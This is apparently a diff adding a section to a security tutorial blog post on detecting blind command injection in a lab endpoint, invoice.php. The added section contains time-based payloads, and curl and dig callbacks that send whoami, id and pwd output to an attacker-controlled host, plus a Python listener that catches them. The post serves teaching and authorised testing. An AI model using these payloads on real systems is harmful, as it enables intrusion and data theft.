@@ -208,6 +208,371 @@ http://0.0.0.0:8080/invoice.php?file=invoice1; ls
 <p><strong>What this means:</strong>
 Attackers can slip commands through that parameter, bypassing any security guardrails, and gain full control of your system without breaking a sweat.</p>
 
+<h2 id="detecting-command-injection-from-echoes-to-silence">Detecting Command Injection: From Echoes to Silence</h2>
+
+<p>Detection relies on understanding how the app <em>behaves</em> when fed hostile input. There are two primary categories:</p>
+
+<h3 id="types-of-command-injection">Types of Command Injection</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Verbose</strong></td>
+      <td>You get immediate feedback. Think <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">id</code>, or <code class="language-plaintext highlighter-rouge">uname -a</code> if the output is reflected in the response, the target is talking.</td>
+    </tr>
+    <tr>
+      <td><strong>Blind</strong></td>
+      <td>No output. The system executes commands silently. You need to analyze behavior, timing, or external signals to confirm execution. This is stealth mode.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="detecting-blind-command-injection">Detecting Blind Command Injection</h2>
+
+<p>The hardest to spot. There’s no direct output just subtle shifts in behavior. You’re probing in the dark, waiting for the system to flinch.</p>
+
+<h3 id="1-time-based-payloads">1. <strong>Time-Based Payloads</strong></h3>
+
+<p>Use commands that introduce a delay. Examples:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ping -c 5 127.0.0.1</code> (Linux)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">timeout /T 5</code> (Windows)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">sleep 5</code></p>
+  </li>
+</ul>
+
+<p>If the response time increases proportionally to the command, the target’s bleeding commands under the hood.</p>
+
+<h4 id="2-out-of-band-oob-detection">2. <strong>Out-of-Band (OOB) Detection</strong></h4>
+
+<p>If you control a server (Burp Collaborator, your own webhook, etc.), use payloads like:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+curl http://yourhost.com/$(whoami)
+</code></pre>
+</div>
+
+<p>If your server receives a pingback? Game over. You’ve got code execution.</p>
+
+<h3 id="3-output-redirection">3. <strong>Output Redirection</strong></h3>
+
+<p>Force output to a file:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+whoami &gt; /tmp/output.txt
+</code></pre>
+</div>
+
+<p>Then attempt to read it:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+cat /tmp/output.txt
+</code></pre>
+</div>
+
+<p>This requires multiple steps and possibly multiple injection points, but if you pull it off it’s a solid confirm.</p>
+
+<hr />
+
+<h2 id="the-curl-trick">The Curl Trick</h2>
+
+<p><code class="language-plaintext highlighter-rouge">curl</code> is the Swiss Army knife of testing. Use it to exfil data, confirm execution, or verify external command execution.</p>
+
+<p>Example payload:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+curl http://yourhost.com?data=$(id)
+</code></pre>
+</div>
+
+<p>If you log the inbound request and see the system’s UID info? You just lit up their internals.</p>
+
+<hr />
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>Blind command injection is about patience, observation, and precision. You’re not shooting bullets you’re setting traps. Always consider the OS, encoding quirks, filters, and how input is parsed.</p>
+
+<p>In the field? Don’t just fire payloads. Read the system. Observe delays. Monitor DNS logs. Force OOB callbacks.</p>
+
+<h1 id="blind-command-injection-in-action">Blind Command Injection in Action</h1>
+
+<p>Let’s break down a live scenario.</p>
+
+<p>We’re working with a vulnerable endpoint:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>At first glance, it just pulls a template based on the <code class="language-plaintext highlighter-rouge">file</code> parameter.</p>
+
+<hr />
+
+<h4 id="initial-test-verbose-attempt">Initial Test Verbose Attempt</h4>
+
+<p>We try to inject a simple system command:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20pwd
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0v77pl16YzMQL0mCrGpWFA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The app responds:</p>
+
+<div class="alert-error">
+[!] Template not found: invoice1; pwd`
+</div>
+
+<p><strong>What this tells us:</strong>
+The input was executed or parsed, but we’re not seeing command output looks like it’s treating everything after <code class="language-plaintext highlighter-rouge">;</code> as part of the filename. So far, no solid confirmation of execution.</p>
+
+<hr />
+
+<h4 id="pivot-to-blind-injection">Pivot to Blind Injection</h4>
+
+<p>Now we go stealth: <strong>time-based testing</strong>.</p>
+
+<p>We craft this payload:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%205
+</code></pre>
+</div>
+
+<p><strong>Result:</strong>
+The page takes ~5 seconds to respond. That’s suspicious.</p>
+
+<p>To confirm, we bump it up:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%2010
+</code></pre>
+</div>
+
+<p><strong>Now it takes 10 seconds.</strong></p>
+
+<p><strong>Bingo.</strong> That delay is our echo in the void. We’re executing commands we’re just blind to the output.</p>
+
+<hr />
+
+<h4 id="visual-proof-gifscreenshot">Visual Proof (GIF/Screenshot)</h4>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_5R3d3TmgaQ4Cp192pe85w.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Visuals here reinforce what’s happening. The delay is tied to our payload. That’s how we <strong>detect blind command injection</strong>  by controlling time, not output.</p>
+
+<h1 id="out-of-band-oob-command-injection-detection">Out-of-Band (OOB) Command Injection Detection</h1>
+<hr />
+
+<p>Blind injection isn’t always about watching timeouts. Sometimes, the system talks <strong>just not to you</strong>. So we make it talk to <strong>us</strong>.</p>
+
+<p>We use <strong>OOB detection</strong> to catch these silent payloads by watching for outbound requests triggered by the app.</p>
+
+<hr />
+
+<h3 id="scenario-setup">Scenario Setup</h3>
+
+<p>Same target:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>We want to test if this endpoint lets us execute system-level commands even if we get no visual output.</p>
+
+<hr />
+
+<h3 id="step-1-set-up-a-listener">Step 1: Set Up a Listener</h3>
+
+<p>We spin up a minimal Python HTTP server to catch any outbound callbacks triggered by tools like <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">wget</code>, or even DNS requests.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+# oob_listener.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+
+class TrapHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        logging.info(f"OOB GET request: {self.path}")
+        print(f"[+] Caught request from {self.client_address[0]} | PATH: {self.path}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'ACK')
+
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
+    server = HTTPServer(('0.0.0.0', 80), TrapHandler)
+    print("[*] Listening for incoming OOB requests on port 80...")
+    server.serve_forever()
+</code></pre>
+</div>
+
+<p><strong>Goal</strong>: Catch any network beacon from the target that hits this listener.</p>
+
+<hr />
+
+<h3 id="step-2-trigger-the-payload">Step 2: Trigger the Payload</h3>
+
+<p>Now that our trap is live, we inject this into the vulnerable URL:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(whoami)
+</code></pre>
+</div>
+
+<p>Or:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(pwd)
+</code></pre>
+</div>
+
+<p><strong>Watch the console</strong> if the app executes our command, it will leak the output (<code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, etc.) into the URL path and hit our trap server.</p>
+
+<hr />
+
+<h3 id="step-3-confirm-execution">Step 3: Confirm Execution</h3>
+
+<p>Your listener should output something like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[+] Caught request from 10.0.2.12 | PATH: /root</code></p>
+
+<p>That means your payload got executed, the app reached out to your server, and it returned the result of <code class="language-plaintext highlighter-rouge">$(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(pwd)</code>.</p>
+
+<p><strong>command execution confirmed via OOB</strong>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OyWoFZy4uaRWq_sMjEghNw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<hr />
+
+<h3 id="why-this-works">Why This Works</h3>
+
+<p>Most apps don’t restrict outbound traffic. So if you can’t see the result on the frontend, you make the backend deliver the result to your own server. It’s like putting a mic on the enemy comms.</p>
+
+<hr />
+
+<h3 id="pro-tips">Pro Tips</h3>
+
+<ul>
+  <li>
+    <p>Use tools like <strong>Burp Collaborator</strong>, <strong>RequestBin</strong>, or your own <strong>DNS/HTTP listener</strong>.</p>
+  </li>
+  <li>
+    <p>Want stealth? Use DNS-based callbacks: <code class="language-plaintext highlighter-rouge">dig $(whoami).yourdomain.com</code></p>
+  </li>
+  <li>
+    <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
+  </li>
+</ul>
+
     </section>
 
     <footer class="mt-8 text-sm text-gray-400">
